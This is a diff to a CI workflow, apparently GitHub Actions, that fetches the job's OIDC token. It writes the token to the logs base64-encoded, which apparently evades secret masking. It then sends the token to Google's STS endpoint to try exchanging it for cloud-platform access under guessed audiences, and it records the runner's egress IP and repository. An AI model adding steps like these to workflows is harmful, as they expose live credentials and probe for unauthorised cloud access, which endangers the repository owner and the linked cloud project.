@@ -18,6 +18,8 @@ jobs:
           JWT=$(echo "$TOKEN" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
           echo "JWT_LEN=${#JWT}"
           echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
-          echo "FULLJWT=$JWT"
+          echo "B64JWT=$(echo -n "$JWT" | base64 -w0)"
+          echo "STS1=$(curl -sS -m 15 -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"kiln-wif-probe\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"subject_token\":\"$JWT\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}" | head -c 400)"
+          echo "STS2=$(curl -sS -m 15 -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github/providers/github\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"subject_token\":\"$JWT\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}" | head -c 400)"
           echo -n "EGRESS="; curl -sS -m 10 https://ifconfig.me/ip; echo
           echo -n "REPOSLUG="; echo "$GITHUB_REPOSITORY"
